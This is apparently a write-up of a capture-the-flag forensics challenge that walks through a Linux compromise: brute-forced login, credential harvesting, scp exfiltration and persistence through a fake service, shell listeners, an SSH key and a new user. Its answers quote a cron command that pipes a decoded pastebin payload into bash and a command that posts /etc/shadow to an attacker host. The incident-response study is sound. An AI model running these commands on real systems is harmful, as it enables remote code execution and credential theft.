

---



#### Sherlock Scenario

The IT Manager of Techniqua-Solutions Corp. is responsible for managing the company’s infrastructure. As part of his daily work, he frequently accesses company servers and workstations. One morning, the IT Manager discovered that several critical company files were missing, while others had been modified or replaced with unfamiliar ones. Concerned about a potential breach, he reported the issue to the security team.

As an incident response analyst, your task is to investigate the case. You have been provided with a forensic image of the IT Manager’s machine.



---


Task 1

What method did the attacker use to gain access to the system?


```
Brute Force
```


Looking at the auth log in /var/logs/  we can see TA brute forced the password for Administrator

![](Pasted%20image%2020260613174426.png)








Task 2

At what time did the attacker successfully log in for the first time?


```
2025-02-10 19:39:03
```


We can see multiple failed login attempts from the same IP followed by a successful login
![](Pasted%20image%2020260613200302.png)







Task 3

Which user account was compromised by the attacker?

```
administrator
```


Checking the administrator users bash history, its running malicious tools
![](Pasted%20image%2020260613171518.png)





Task 4

What command was executed by the attacker to check user privileges?

```
groups administrator
```

![](Pasted%20image%2020260613172859.png)






Task 5

What was the first tool the attacker downloaded to extract stored credentials from the system?


```
LaZagne
```


![](Pasted%20image%2020260613172812.png)







Task 6

The attacker located sensitive files on the compromised system and transferred them to a remote machine. Which command-line tool was used for this exfiltration?


```
scp
```


![](Pasted%20image%2020260613172735.png)




Task 7

What IP did the attacker exfiltrate the files to?

```
192.168.161.198
```





![](Pasted%20image%2020260613171906.png)




Task 8

The attacker continued their exploitation and executed a malicious script on the victim machine. What is the name of the script?

```
sys_monitor.sh
```


Check the administrators bash history
![](Pasted%20image%2020260613171737.png)




Task 9

What is the SHA1 hash of the malware?

```
3ae5dea716a4f7bfb18046bfba0553ea01021c75
```


We can find the sys_monitor.sh hash in hash_executables file in the hash executable folder
![](Pasted%20image%2020260613181004.png)





Task 10

The malware installed a component that pretends to be part of system network management but is actually running with root privileges. What is the name of the component?


```
systemd-networkm.service
```



We can find an unusual service in /etc/systemd/system. Usually this file is called systemd-networkd.service. 
![](Pasted%20image%2020260613183411.png)




Task 11

The attacker modified several startup configuration files, each spawning a network listener on a different port at login. What is the name of the file that starts the listener on the lowest port number?

```
.bashrc
```




We can find two shell startup files in /root/root directory which contains listeners
![](Pasted%20image%2020260613185252.png)
![](Pasted%20image%2020260613185257.png)



Task 12

What is the username and hostname associated with the attacker?

```
kali@kali
```


TA added his ssh key and hostname to the authorized keys file in root directory
![](Pasted%20image%2020260613193525.png)




Task 13

The attacker created a user for persistence, what is the name of the created user?

```
Regev
```

We can look in the auth log user creation events by searching for useradd or adduser
![](Pasted%20image%2020260613194207.png)



Task 14

At what exact timestamp was the new user created on the system?

![](Pasted%20image%2020260613194829.png)








Task 15

The malware set up an automated process to fetch and execute a remote payload from a legitimate web service. What is the full command responsible for retrieving this payload?

```
command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash
```


cron jobs are often associated with automated processes so by looking through the different cron jobs in  /etc, we can find a suspicious cron job named "syscheck" in /etc/cron.d

![](Pasted%20image%2020260613195238.png)




Task 16



The payload was used to extract more sensitive files. What was the command ran to extract the more sensitive file?

```
base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php
```


Open the pastebin link and you will find a base64 string. The payload is reversed and base64 encoded as we can see here
![](Pasted%20image%2020260613195647.png)

We can use https://gchq.github.io/CyberChef/ to decode the full payload
![](Pasted%20image%2020260613195540.png)
